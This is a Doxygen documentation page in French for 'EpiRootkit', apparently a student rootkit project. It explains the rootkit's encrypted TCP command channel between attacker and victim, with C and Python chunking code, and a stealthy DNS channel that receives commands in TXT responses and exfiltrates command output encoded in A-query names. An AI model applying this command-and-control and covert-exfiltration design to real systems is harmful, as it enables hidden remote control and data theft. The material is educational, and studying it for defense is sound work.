<!-- HTML header for doxygen 1.13.2-->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "https://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">
<head>
<meta http-equiv="Content-Type" content="text/xhtml;charset=UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=11"/>
<meta name="generator" content="Doxygen 1.9.8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>EpiRootkit: Réseau</title>
<!--BEGIN PROJECT_ICON-->
<link rel="icon" href="../../$projecticon" type="image/x-icon" />
<!--END PROJECT_ICON-->
<link href="../../tabs.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../jquery.js"></script>
<script type="text/javascript" src="../../dynsections.js"></script>
<!--BEGIN COPY_CLIPBOARD-->
<script type="text/javascript" src="../../clipboard.js"></script>
<!--END COPY_CLIPBOARD-->
<link href="../../navtree.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../resize.js"></script>
<script type="text/javascript" src="../../navtreedata.js"></script>
<script type="text/javascript" src="../../navtree.js"></script>
<link href="../../search/search.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../search/searchdata.js"></script>
<script type="text/javascript" src="../../search/search.js"></script>
<link href="../../doxygen.css" rel="stylesheet" type="text/css" />
<link href="../../doxygen-awesome.css" rel="stylesheet" type="text/css"/>
  <script type="text/javascript" src="../../doxygen-awesome-darkmode-toggle.js"></script>
    <script type="text/javascript">
      DoxygenAwesomeDarkModeToggle.init()
    </script>
  <script type="text/javascript" src="../../doxygen-awesome-interactive-toc.js"></script>
    <script type="text/javascript">
      DoxygenAwesomeInteractiveToc.init()
      DoxygenAwesomeInteractiveToc.hideMobileMenu = false
      DoxygenAwesomeInteractiveToc.topOffset = 45
  </script>
</head>
<body>
<div id="top"><!-- do not remove this div, it is closed by doxygen! -->
<div id="titlearea">
<table cellspacing="0" cellpadding="0">
 <tbody>
 <tr id="projectrow">
  <td id="projectlogo"><img alt="Logo" src="../../logo_no_text.png"$logosize/></td>
  <td id="projectalign">
   <div id="projectname">EpiRootkit
   </div>
   <div id="projectbrief">Par STDBOOL</div>
  </td>
 </tr>
 </tbody>
</table>
</div>
<!-- end header part -->
<!-- Generated by Doxygen 1.9.8 -->
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
var searchBox = new SearchBox("searchBox", "../../search/",'.html');
/* @license-end */
</script>
<script type="text/javascript" src="../../menudata.js"></script>
<script type="text/javascript" src="../../menu.js"></script>
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
$(function() {
  initMenu('../../',true,false,'search.php','Search');
  $(document).ready(function() { init_search(); });
});
/* @license-end */
</script>
<div id="main-nav"></div>
</div><!-- top -->
<div id="side-nav" class="ui-resizable side-nav-resizable">
  <div id="nav-tree">
    <div id="nav-tree-contents">
      <div id="nav-sync" class="sync"></div>
    </div>
  </div>
  <div id="splitbar" style="-moz-user-select:none;" 
       class="ui-resizable-handle">
  </div>
</div>
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
$(document).ready(function(){initNavTree('d5/dc4/network.html','../../'); initResizable(); });
/* @license-end */
</script>
<div id="doc-content">
<!-- window showing the filter options -->
<div id="MSearchSelectWindow"
     onmouseover="return searchBox.OnSearchSelectShow()"
     onmouseout="return searchBox.OnSearchSelectHide()"
     onkeydown="return searchBox.OnSearchSelectKey(event)">
</div>

<!-- iframe showing the search results (closed by default) -->
<div id="MSearchResultsWindow">
<div id="MSearchResults">
<div class="SRPage">
<div id="SRIndex">
<div id="SRResults"></div>
<div class="SRStatus" id="Loading">Loading...</div>
<div class="SRStatus" id="Searching">Searching...</div>
<div class="SRStatus" id="NoMatches">No Matches</div>
</div>
</div>
</div>
</div>

<div><div class="header">
  <div class="headertitle"><div class="title">Réseau</div></div>
</div><!--header-->
<div class="contents">
<div class="toc"><h3>Table of Contents</h3>
<ul><ul><li class="level2"><a href="#autotoc_md43">1. 🌐 Introduction</a></li>
<li class="level2"><a href="#autotoc_md44">2. 🤝 TCP</a><ul><li class="level3"><a href="#autotoc_md45">2.1 🧠 Introduction</a></li>
<li class="level3"><a href="#tcp-protocole">2.2 📦 Protocole</a><ul><li class="level4"><a href="#autotoc_md46">Constantes importantes</a></li>
<li class="level4"><a href="#autotoc_md47">Objectif</a></li>
<li class="level4"><a href="#autotoc_md48">Structure générale</a></li>
<li class="level4"><a href="#autotoc_md49">Champs</a></li>
<li class="level4"><a href="#autotoc_md50">Envoi</a></li>
<li class="level4"><a href="#autotoc_md51">Réception</a></li>
<li class="level4"><a href="#autotoc_md52">Points forts</a></li>
<li class="level4"><a href="#autotoc_md53">Limitations</a></li>
</ul>
</li>
<li class="level3"><a href="#autotoc_md54">2.3 🛠️ Implémentation</a></li>
</ul>
</li>
<li class="level2"><a href="#autotoc_md55">3. 🧭 DNS</a><ul><li class="level3"><a href="#autotoc_md56">3.1 🧠 Principes</a></li>
<li class="level3"><a href="#autotoc_md57">3.2 📨 Requête</a><ul><li class="level4"><a href="#autotoc_md58">3.2.1 Header</a></li>
<li class="level4"><a href="#autotoc_md59">3.2.2 QNAME</a></li>
<li class="level4"><a href="#autotoc_md60">3.2.3 Socket</a></li>
<li class="level4"><a href="#autotoc_md61">3.2.4 Réponse</a></li>
</ul>
</li>
<li class="level3"><a href="#autotoc_md62">3.3 🎯 Commandes</a><ul><li class="level4"><a href="#autotoc_md63">3.3.1 Worker</a></li>
<li class="level4"><a href="#autotoc_md64">3.3.2 Réception</a></li>
</ul>
</li>
<li class="level3"><a href="#autotoc_md65">3.4 🛰️ Exfiltration</a></li>
</ul>
</li>
<li class="level2"><a href="#autotoc_md66">4. 🔒 Chiffrement</a><ul><ul><li class="level4"><a href="#autotoc_md67">Principes</a></li>
<li class="level4"><a href="#autotoc_md68">Implémentation</a></li>
<li class="level4"><a href="#autotoc_md69">Résumé</a></li>
</ul>
</ul>
</li>
</ul>
</ul>
</div>
<div class="textblock"><h2><a class="anchor" id="autotoc_md43"></a>
1. 🌐 Introduction</h2>
<p>Le rootkit implémente deux canaux de communication réseau principaux entre la machine attaquante et la machine victime :</p><ul>
<li>Un canal <b>TCP</b> chiffré pour l’échange de commandes et de données.</li>
<li>Un canal <b>DNS</b> furtif pour l’envoi de commandes et la réception de résultats via des requêtes DNS. Ces deux canaux utilisent le chiffrement AES-128 pour sécuriser les données échangées. Le canal TCP est le canal principal, tandis que le canal DNS est utilisé comme méthode de communication de secours ou furtive.</li>
</ul>
<h2><a class="anchor" id="autotoc_md44"></a>
2. 🤝 TCP</h2>
<h3><a class="anchor" id="autotoc_md45"></a>
2.1 🧠 Introduction</h3>
<p>Dans l’objectif de sécuriser nos communications réseau, nous avons fait le choix d'utiliser le chiffrement AES-128 pour toutes les données échangées entre le client et le serveur. Cependant, le défaut de cet algorithme est qu'il ne permet pas de transmettre des données de taille arbitraire. En effet, le chiffrement AES-128 produit un bloc de 16 octets, ce qui signifie que les données doivent être découpées en blocs de cette taille avant d'être chiffrées.</p>
<p>Or, lors de la transmission de données via un socket, il est courant que les données soient de taille variable, ce qui pose un problème pour le chiffrement. Il en est bien sûr de même pour les données reçues, qui peuvent être de taille variable et ne pas correspondre à un multiple de 16 octets.</p>
<p>Pour résoudre ce problème, nous avons mis en place un protocole personnalisé de transmission chunkée. Ce protocole permet de découper les données en chunks de taille fixe, chacun étant enrichi d'un en-tête (non chiffré) pour l'identification, la reconstruction et la détection des erreurs. Ainsi, même si les données sont de taille variable, elles peuvent être découpées en chunks de taille fixe, ce qui permet de les chiffrer et de les transmettre de manière fiable.</p>
<h3><a class="anchor" id="tcp-protocole"></a>
2.2 📦 Protocole</h3>
<h4><a class="anchor" id="autotoc_md46"></a>
Constantes importantes</h4>
<div class="full_width_table"> <table class="markdownTable">
<tr class="markdownTableHead">
<th class="markdownTableHeadNone">Constante   </th><th class="markdownTableHeadNone">Valeur par défaut   </th><th class="markdownTableHeadNone">Description    </th></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone"><code>STD_BUFFER_SIZE</code>   </td><td class="markdownTableBodyNone">1024   </td><td class="markdownTableBodyNone">Taille fixe des buffers utilisés    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone"><code>CHUNK_OVERHEAD</code>   </td><td class="markdownTableBodyNone">11   </td><td class="markdownTableBodyNone">10 (header) + 1 (EOT_CODE)    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone"><code>EOT_CODE</code>   </td><td class="markdownTableBodyNone"><code>0x04</code>   </td><td class="markdownTableBodyNone">Code ASCII pour "End of Transmission"   </td></tr>
</table>
</div><h4><a class="anchor" id="autotoc_md47"></a>
Objectif</h4>
<p>Ce protocole personnalisé permet de transmettre de manière fiable des données de taille arbitraire (texte ou fichiers) entre un client et un serveur via un socket noyau. Les données sont <b>chiffrées</b> puis <b>découpées en chunks fixes</b>, chacun enrichi d’un en-tête pour l’identification, la reconstruction et la détection des erreurs.</p>
<h4><a class="anchor" id="autotoc_md48"></a>
Structure générale</h4>
<p>Chaque chunk est un buffer de taille constante <code>STD_BUFFER_SIZE</code> octets structuré comme suit :</p>
<div class="fragment"><div class="line">+-------------------+-------------------+-------------------+-------------------------------+------------+</div>
<div class="line">| total_chunks (4B) | chunk_index (4B)  | data_len (2B)     | payload (≤ BODY_SIZE, var.)   | EOT (1B)   |</div>
<div class="line">+-------------------+-------------------+-------------------+-------------------------------+------------+</div>
</div><!-- fragment --><h4><a class="anchor" id="autotoc_md49"></a>
Champs</h4>
<div class="full_width_table"> <table class="markdownTable">
<tr class="markdownTableHead">
<th class="markdownTableHeadNone">Champ   </th><th class="markdownTableHeadNone">Taille   </th><th class="markdownTableHeadNone">Description    </th></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone"><code>total_chunks</code>   </td><td class="markdownTableBodyNone">4 octets   </td><td class="markdownTableBodyNone">Nombre total de chunks (big-endian)    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone"><code>chunk_index</code>   </td><td class="markdownTableBodyNone">4 octets   </td><td class="markdownTableBodyNone">Index de ce chunk dans la séquence (big-endian)    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone"><code>data_len</code>   </td><td class="markdownTableBodyNone">2 octets   </td><td class="markdownTableBodyNone">Longueur réelle des données dans le chunk (big-endian)    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone"><code>payload</code>   </td><td class="markdownTableBodyNone">variable   </td><td class="markdownTableBodyNone">Données chiffrées    </td></tr>
<tr class="markdownTableRowOdd">
<td class="markdownTableBodyNone"><code>EOT_CODE</code>   </td><td class="markdownTableBodyNone">1 octet   </td><td class="markdownTableBodyNone">Code de fin de transmission pour le chunk (valide si positionné)    </td></tr>
<tr class="markdownTableRowEven">
<td class="markdownTableBodyNone"><code>padding</code>   </td><td class="markdownTableBodyNone">variable   </td><td class="markdownTableBodyNone">Remplissage pour atteindre <code>STD_BUFFER_SIZE</code>, ignoré à la réception   </td></tr>
</table>
</div> <blockquote class="doxtable">
<p>&zwj;🔒 <b>Toutes les données envoyées dans le payload sont chiffrées avant le découpage en chunks.</b> </p>
</blockquote>
<h4><a class="anchor" id="autotoc_md50"></a>
Envoi</h4>
<ol type="1">
<li><b>Chiffrement :</b> La donnée brute est chiffrée avec AES-128 via <code>encrypt_buffer</code>.</li>
<li><b>Découpage :</b> Le buffer chiffré est segmenté en chunks de <code>BODY_SIZE</code> (= <code>STD_BUFFER_SIZE - 11 (HEADER_SIZE + FOOTER_SIZE)</code>).</li>
<li><b>Encapsulation :</b> Chaque chunk est préfixé par un en-tête structuré contenant :<ul>
<li>Le nombre total de chunks</li>
<li>L’index du chunk</li>
<li>La longueur des données utiles</li>
<li>Le marqueur <code>EOT_CODE</code> à la fin des données</li>
</ul>
</li>
<li><b>Envoi :</b> Chaque chunk est envoyé via <code>kernel_sendmsg</code>.</li>
</ol>
<h4><a class="anchor" id="autotoc_md51"></a>
Réception</h4>
<ol type="1">
<li><b>Lecture progressive :</b><ul>
<li>Lecture de l'en-tête (10 octets).</li>
<li>Lecture du <code>payload</code> + <code>EOT</code> (données utiles).</li>
<li>Lecture des éventuels octets de padding.</li>
</ul>
</li>
<li><b>Validation :</b><ul>
<li>Vérifie les tailles.</li>
<li>Vérifie la présence correcte du <code>EOT_CODE</code>.</li>
<li>Assure la cohérence de <code>total_chunks</code> et <code>chunk_index</code>.</li>
</ul>
</li>
<li><b>Assemblage :</b><ul>
<li>Alloue un tampon de réception si c’est le premier chunk.</li>
<li>Marque chaque chunk reçu comme <code>vu</code>.</li>
<li>Recopie les données à la bonne position.</li>
<li>Attend la réception de tous les chunks.</li>
</ul>
</li>
<li><b>Déchiffrement :</b> Une fois tous les chunks reçus, assemble et déchiffre les données avec l'algorithme AES-128.</li>
<li><b>Traitement du message reçu :</b><ul>
<li>Si la donnée commence par <code>exec</code>, la traite comme commande texte.</li>
<li>Si un transfert de fichier est en cours, les données reçues sont gérées par la partie de transfert de fichiers.</li>
<li>Sinon, elle est copiée vers le tampon utilisateur.</li>
</ul>
</li>
</ol>
<h4><a class="anchor" id="autotoc_md52"></a>
Points forts</h4>
<ul>
<li><b>Fiabilité :</b> Chaque chunk contient des méta-informations pour la vérification de cohérence.</li>
<li><b>Idempotence :</b> Les chunks sont gérés de sorte à ce que les doublons ne posent pas de souci (copie directe des données dans un tableau en utilisant l'index de chunk).</li>
<li><b>Taille arbitraire :</b> Le protocole supporte l'envoi de messages faisant jusqu'à 4 To.</li>
<li><b>Sécurité :</b> Tous les transferts sont chiffrés.</li>
<li><b>Flexibilité :</b> Gère à la fois les transferts de texte brut et de fichiers binaires.</li>
</ul>
<h4><a class="anchor" id="autotoc_md53"></a>
Limitations</h4>
<ul>
<li>Le protocole ne gère pas les retransmissions : il suppose que les sockets sont fiables ou que les erreurs de transmission sont gérées par le protocole TCP sous-jacent.</li>
<li>Aucun checksum n’est intégré pour vérifier l'intégrité après chiffrement.</li>
<li>Le temps d’attente pour recevoir tous les chunks n’est pas limité (peut bloquer indéfiniment).</li>
</ul>
<h3><a class="anchor" id="autotoc_md54"></a>
2.3 🛠️ Implémentation</h3>
<p>Le protocole personnalisé de transmission chunkée est implémenté dans les fichiers <code><a class="el" href="../../d6/d6e/network_8c.html">network.c</a></code> (pour le rootkit) et le fichier <code><a class="el" href="../../d3/d9a/AESNetworkHandler_8py.html">AESNetworkHandler.py</a></code> (pour l'attaquant). Voici un aperçu des principales fonctions : Les fonctions principales du protocole chunké sont :</p>
<ul>
<li><p class="startli"><code><a class="el" href="../../d6/d6e/network_8c.html#a57b1c96d9aa9b9d9453d0dca6a7c3b87">send_to_server_raw(const char *data, size_t len)</a></code> : Cette fonction chiffre les données à envoyer, les découpe en chunks de taille fixe, ajoute un en-tête à chaque chunk (nombre total de chunks, index, taille utile, marqueur de fin), puis les envoie un à un via le socket noyau. <br  />
 Exemple simplifié :</p>
<div class="fragment"><div class="line"><span class="comment">// Encrypt the data before sending</span></div>
<div class="line"><span class="keywordflow">if</span> (<a class="code hl_function" href="../../dd/d34/aes_8c.html#a3e5d8f107c3453c7e498e162026f2dac">encrypt_buffer</a>(data, len, &amp;encrypted_msg, &amp;encrypted_len) &lt; 0)</div>
<div class="line">      <span class="keywordflow">return</span> -EIO;</div>
<div class="line"> </div>
<div class="line"><span class="comment">// [... Calculate number of chunks and max chunk body size...]</span></div>
<div class="line"> </div>
<div class="line"><span class="comment">// Send each chunk separately</span></div>
<div class="line"><span class="keywordflow">for</span> (i = 0; i &lt; nb_chunks; ++i) {</div>
<div class="line">    <span class="comment">// Construction of the header </span></div>
<div class="line">    <span class="comment">// total_chunks in big-endian 32 bits</span></div>
<div class="line">    uint32_t tc = (uint32_t)nb_chunks;</div>
<div class="line">    chunk[0] = (uint8_t)((tc &gt;&gt; 24) &amp; 0xFF);</div>
<div class="line">    chunk[1] = (uint8_t)((tc &gt;&gt; 16) &amp; 0xFF);</div>
<div class="line">    chunk[2] = (uint8_t)((tc &gt;&gt; 8) &amp; 0xFF);</div>
<div class="line">    chunk[3] = (uint8_t)((tc &gt;&gt; 0) &amp; 0xFF);</div>
<div class="line"> </div>
<div class="line">    <span class="comment">// chunk_index in big-endian 32 bits</span></div>
<div class="line">    uint32_t ci = (uint32_t)i;</div>
<div class="line">    chunk[4] = (uint8_t)((ci &gt;&gt; 24) &amp; 0xFF);</div>
<div class="line">    chunk[5] = (uint8_t)((ci &gt;&gt; 16) &amp; 0xFF);</div>
<div class="line">    chunk[6] = (uint8_t)((ci &gt;&gt; 8) &amp; 0xFF);</div>
<div class="line">    chunk[7] = (uint8_t)((ci &gt;&gt; 0) &amp; 0xFF);</div>
<div class="line"> </div>
<div class="line">    <span class="comment">// chunk_len in big-endian 16 bits</span></div>
<div class="line">    uint16_t cl = (uint16_t)chunk_len;</div>
<div class="line">    chunk[8] = (uint8_t)((cl &gt;&gt; 8) &amp; 0xFF);</div>
<div class="line">    chunk[9] = (uint8_t)((cl &gt;&gt; 0) &amp; 0xFF);</div>
<div class="line"> </div>
<div class="line">    <span class="comment">// Copy the encrypted message into the chunk</span></div>
<div class="line">    memcpy(chunk + 10, encrypted_msg + i * max_chunk_body, chunk_len);</div>
<div class="line"> </div>
<div class="line">    <span class="comment">// Add the EOT_CODE at the end</span></div>
<div class="line">    chunk[10 + chunk_len] = <a class="code hl_define" href="../../d6/d6e/network_8c.html#a2d214f4194a9f20a702b2ba69159a868">EOT_CODE</a>;</div>
<div class="line">    </div>
<div class="line">    <span class="comment">// [... Send the chunk via kernel_sendmsg ...]</span></div>
<div class="line">}</div>
<div class="ttc" id="aaes_8c_html_a3e5d8f107c3453c7e498e162026f2dac"><div class="ttname"><a href="../../dd/d34/aes_8c.html#a3e5d8f107c3453c7e498e162026f2dac">encrypt_buffer</a></div><div class="ttdeci">int encrypt_buffer(const char *in, size_t in_len, char **out, size_t *out_len)</div><div class="ttdoc">Encrypts a buffer using AES-128 in CBC mode.</div><div class="ttdef"><b>Definition</b> <a href="../../dd/d34/aes_8c_source.html#l00322">aes.c:322</a></div></div>
<div class="ttc" id="anetwork_8c_html_a2d214f4194a9f20a702b2ba69159a868"><div class="ttname"><a href="../../d6/d6e/network_8c.html#a2d214f4194a9f20a702b2ba69159a868">EOT_CODE</a></div><div class="ttdeci">#define EOT_CODE</div><div class="ttdef"><b>Definition</b> <a href="../../d6/d6e/network_8c_source.html#l00018">network.c:18</a></div></div>
</div><!-- fragment --></li>
<li><code><a class="el" href="../../d6/d6e/network_8c.html#a666e3b95602cc2a6ef57a2af56b0d8ef">receive_from_server(char *buffer, size_t max_len)</a></code> : <br  />
 Cette fonction lit les données reçues depuis le socket noyau, lit chaque chunk, vérifie son en-tête, assemble les données dans un tampon de réception, et déchiffre le message complet une fois tous les chunks reçus. Ce ne sont finalement que les opérations inverses de <code>send_to_server_raw</code>. Voici l'exemple de l'implémentation analogue en python (présente dans <code><a class="el" href="../../d3/d9a/AESNetworkHandler_8py.html">AESNetworkHandler.py</a></code>) : <div class="fragment"><div class="line"><span class="keyword">def </span>receive(self, sock: socket.socket) -&gt; str | bool:</div>
<div class="line">      <span class="comment"># buffer containing the full received message</span></div>
<div class="line">      buffer = bytearray()</div>
<div class="line">      <span class="comment"># List to track received chunks (initialized with first received chunk)</span></div>
<div class="line">      received_chunks = <span class="keywordtype">None</span></div>
<div class="line">      <span class="comment"># Total number of chunks to expect (initialized with first received chunk)</span></div>
<div class="line">      total_chunks = <span class="keywordtype">None</span></div>
<div class="line"> </div>
<div class="line">      <span class="keywordflow">while</span> <span class="keyword">True</span>:</div>
<div class="line">          head = <span class="comment"># [... Read the header (10 bytes) from the socket ...]</span></div>
<div class="line"> </div>
<div class="line">          total_chunks_read = (</div>
<div class="line">              (head[0] &lt;&lt; 24) |</div>
<div class="line">              (head[1] &lt;&lt; 16) |</div>
<div class="line">              (head[2] &lt;&lt; 8)  |</div>
<div class="line">              (head[3] &lt;&lt; 0)</div>
<div class="line">          )</div>
<div class="line">          chunk_index = (</div>
<div class="line">              (head[4] &lt;&lt; 24) |</div>
<div class="line">              (head[5] &lt;&lt; 16) |</div>
<div class="line">              (head[6] &lt;&lt; 8)  |</div>
<div class="line">              (head[7] &lt;&lt; 0)</div>
<div class="line">          )</div>
<div class="line">          chunk_len = (head[8] &lt;&lt; 8) | head[9]</div>
<div class="line"> </div>
<div class="line">          needed = self._header_size + chunk_len + 1</div>
<div class="line">          <span class="keywordflow">if</span> needed &gt; self._buffer_size:</div>
<div class="line">              print(f<span class="stringliteral">&quot;[RECEIVE ERROR] chunk_len {chunk_len} inconsistent (need {needed} &gt; {self._buffer_size})&quot;</span>)</div>
<div class="line">              <span class="keywordflow">return</span> <span class="keyword">False</span></div>
<div class="line"> </div>
<div class="line">          <span class="comment"># Read payload plus EOT</span></div>
<div class="line">          payload_plus_eot = self._recv_exact(sock, chunk_len + 1)</div>
<div class="line">          </div>
<div class="line">          <span class="comment"># [... Check payload and EOT code validity ...]</span></div>
<div class="line"> </div>
<div class="line">          <span class="comment"># Initialize tracking on the first chunk</span></div>
<div class="line">          <span class="keywordflow">if</span> total_chunks <span class="keywordflow">is</span> <span class="keywordtype">None</span>:</div>
<div class="line">              received_chunks = [<span class="keyword">False</span>] * total_chunks_read</div>
<div class="line"> </div>
<div class="line">          <span class="comment"># [... Check chunk_index validity (prevent out of bounds) ...]</span></div>
<div class="line"> </div>
<div class="line">          <span class="comment"># [... Construct the full ciphered message ...]</span></div>
<div class="line"> </div>
<div class="line">          <span class="comment"># Mark this chunk as received</span></div>
<div class="line">          received_chunks[chunk_index] = <span class="keyword">True</span></div>
<div class="line"> </div>
<div class="line">          <span class="comment"># If all chunks are received, break</span></div>
<div class="line">          <span class="keywordflow">if</span> all(received_chunks):</div>
<div class="line">              <span class="keywordflow">break</span></div>
<div class="line"> </div>
<div class="line">      <span class="keywordflow">return</span> <span class="comment"># [...decrypted full message...]</span></div>
</div><!-- fragment --></li>
</ul>
<h2><a class="anchor" id="autotoc_md55"></a>
3. 🧭 DNS</h2>
<p>Dans le cadre de ce projet, la communication principale utilisée pour l’échange de paquets entre les deux machines virtuelles repose naturellement sur le protocole TCP. Cependant, nous avons choisi de mettre en œuvre une méthode de communication alternative afin d’introduire un aspect furtif aux échanges. L’objectif est de démontrer comment envoyer des commandes à une machine cible via des requêtes DNS de type <b>TXT</b>, puis d’exfiltrer les résultats de ces commandes en les encapsulant dans des requêtes DNS de type <b>A</b>.</p>
<h3><a class="anchor" id="autotoc_md56"></a>
3.1 🧠 Principes</h3>
<p>Nous supposons ici un scénario réel, où il n’est pas possible de mettre en place un serveur DNS côté victime, notamment en raison de restrictions réseau ou d’un éventuel blocage par un pare-feu. Par conséquent, la solution adoptée consiste à mettre en place un serveur DNS côté attaquant. Depuis l’espace noyau, la machine victime enverra des requêtes DNS de type <b>TXT</b> vers un domaine du type <em>command.dns.google.com</em>, afin de demander des informations textuelles. C’est dans la réponse à cette requête que l’attaquant peut insérer une commande, si une est disponible. Sinon, la réponse sera vide.</p>
<p>Pour permettre à la victime d’envoyer des résultats d’exécution ou d’autres informations en retour, celle-ci enverra des requêtes DNS de type <b>A</b>, où le nom de domaine contient les données chiffrées. Comme la taille maximale d’un nom de domaine est limitée, et que le domaine complet inclut un suffixe du type *.dns.google.com* ainsi que des identifiants de chunk comme <em>xx/xx-</em>, les données doivent être fragmentées en plusieurs morceaux. Par défaut :</p><ul>
<li>Le polling DNS de la victime s’effectue toutes les 5000 ms pour diminuer l’activité réseau (une piste d’amélioration serait d’introduire une part d’aléatoire dans le mécanisme de polling).</li>
<li>Le nombre de chunks est limité à 128 (<a class="el" href="../../db/d16/config_8h.html">config.h</a>), afin d’éviter des délais excessifs côté attaquant, tout en maintenant un niveau de furtivité raisonnable.</li>
</ul>
<p>Une fois les données reçues, le serveur DNS (côté attaquant) peut simplement répondre avec une adresse IP arbitraire, par exemple <b>127.0.0.1</b>, puisque l’adresse <b>IP</b> n’a aucune importance dans ce contexte. Si je ne me suis pas trompé dans les calculs (ce qui a de grandes chances d’arriver), on peut envoyer depuis la victime vers l’attaquant 57 octets de données utiles par requête <b>A</b>, ce qui restreint évidemment le volume à transférer et augmente le nombre de chunks (en plus avec le chiffrement...). Pour l’envoi de commandes depuis l’attaquant, la limite est beaucoup plus élevée, soit environ 459 octets (dans le champ <b>RDATA</b> d’un enregistrement <b>TXT</b>).</p>
<p><img src="../../dns_technique.svg" alt="" style="pointer-events: none; 
    display: block;
    margin: 20px auto;
    overflow: hidden;
  " class="inline"/></p>
<h3><a class="anchor" id="autotoc_md57"></a>
3.2 📨 Requête</h3>
<h4><a class="anchor" id="autotoc_md58"></a>
3.2.1 Header</h4>
<p>Dans le fichier <a class="el" href="../../d9/d54/dns_8c.html">dns.c</a>, on trouve la définition (packing byte-à-byte) d’un header DNS. En byte order réseau (big-endian), on utilise la fonction <code>htons()</code> pour chaque champ 16 bits avant de le copier en mémoire. Le <code>#pragma pack(push, 1)</code> s’assure que la structure n’a pas d’alignement automatique, afin que le remplissage en octets soit exactement linéaire (12 octets).</p>
<p><img src="../../dns_header.svg" alt="" style="pointer-events: none; 
    display: block;
    margin: 20px auto;
    overflow: hidden;
  " class="inline"/></p>
<div class="fragment"><div class="line"><span class="preprocessor">#pragma pack(push, 1)</span></div>
<div class="line"><span class="keyword">struct </span><a class="code hl_struct" href="../../de/dd9/structdns__header__t.html">dns_header_t</a> {</div>
<div class="line">    __be16 <a class="code hl_variable" href="../../de/dd9/structdns__header__t.html#a555bb3191b65b5e9599f447653ed981d">id</a>;          <span class="comment">// Identification (16 bits)</span></div>
<div class="line">    __be16 <a class="code hl_variable" href="../../de/dd9/structdns__header__t.html#af4f7a53f6b2df72c34ca881f2714ac91">flags</a>;       <span class="comment">// Flags + codes de réponse (16 bits)</span></div>
<div class="line">    __be16 <a class="code hl_variable" href="../../de/dd9/structdns__header__t.html#a8374f34065d456334e3c63c2ff3306cb">qdcount</a>;     <span class="comment">// Nombre de questions (16 bits)</span></div>
<div class="line">    __be16 <a class="code hl_variable" href="../../de/dd9/structdns__header__t.html#acb0a9a6e729d7ba375297cf625fc938b">ancount</a>;     <span class="comment">// Nombre d’answers (réponses) (16 bits)</span></div>
<div class="line">    __be16 <a class="code hl_variable" href="../../de/dd9/structdns__header__t.html#a5c1e988df4a22654a80ef9bbd5e83a13">nscount</a>;     <span class="comment">// Nombre d’autorités (authority RRs) (16 bits)</span></div>
<div class="line">    __be16 <a class="code hl_variable" href="../../de/dd9/structdns__header__t.html#af107879d493519cfa3dae4c4eb03e6c3">arcount</a>;     <span class="comment">// Nombre de RRs additionnels (RRs) (16 bits)</span></div>
<div class="line">};</div>
<div class="line"><span class="preprocessor">#pragma pack(pop)</span></div>
<div class="ttc" id="astructdns__header__t_html"><div class="ttname"><a href="../../de/dd9/structdns__header__t.html">dns_header_t</a></div><div class="ttdoc">DNS protocol header (network byte order, it is important).</div><div class="ttdef"><b>Definition</b> <a href="../../d9/d54/dns_8c_source.html#l00010">dns.c:10</a></div></div>
<div class="ttc" id="astructdns__header__t_html_a555bb3191b65b5e9599f447653ed981d"><div class="ttname"><a href="../../de/dd9/structdns__header__t.html#a555bb3191b65b5e9599f447653ed981d">dns_header_t::id</a></div><div class="ttdeci">__be16 id</div><div class="ttdef"><b>Definition</b> <a href="../../d9/d54/dns_8c_source.html#l00011">dns.c:11</a></div></div>
<div class="ttc" id="astructdns__header__t_html_a5c1e988df4a22654a80ef9bbd5e83a13"><div class="ttname"><a href="../../de/dd9/structdns__header__t.html#a5c1e988df4a22654a80ef9bbd5e83a13">dns_header_t::nscount</a></div><div class="ttdeci">__be16 nscount</div><div class="ttdef"><b>Definition</b> <a href="../../d9/d54/dns_8c_source.html#l00015">dns.c:15</a></div></div>
<div class="ttc" id="astructdns__header__t_html_a8374f34065d456334e3c63c2ff3306cb"><div class="ttname"><a href="../../de/dd9/structdns__header__t.html#a8374f34065d456334e3c63c2ff3306cb">dns_header_t::qdcount</a></div><div class="ttdeci">__be16 qdcount</div><div class="ttdef"><b>Definition</b> <a href="../../d9/d54/dns_8c_source.html#l00013">dns.c:13</a></div></div>
<div class="ttc" id="astructdns__header__t_html_acb0a9a6e729d7ba375297cf625fc938b"><div class="ttname"><a href="../../de/dd9/structdns__header__t.html#acb0a9a6e729d7ba375297cf625fc938b">dns_header_t::ancount</a></div><div class="ttdeci">__be16 ancount</div><div class="ttdef"><b>Definition</b> <a href="../../d9/d54/dns_8c_source.html#l00014">dns.c:14</a></div></div>
<div class="ttc" id="astructdns__header__t_html_af107879d493519cfa3dae4c4eb03e6c3"><div class="ttname"><a href="../../de/dd9/structdns__header__t.html#af107879d493519cfa3dae4c4eb03e6c3">dns_header_t::arcount</a></div><div class="ttdeci">__be16 arcount</div><div class="ttdef"><b>Definition</b> <a href="../../d9/d54/dns_8c_source.html#l00016">dns.c:16</a></div></div>
<div class="ttc" id="astructdns__header__t_html_af4f7a53f6b2df72c34ca881f2714ac91"><div class="ttname"><a href="../../de/dd9/structdns__header__t.html#af4f7a53f6b2df72c34ca881f2714ac91">dns_header_t::flags</a></div><div class="ttdeci">__be16 flags</div><div class="ttdef"><b>Definition</b> <a href="../../d9/d54/dns_8c_source.html#l00012">dns.c:12</a></div></div>
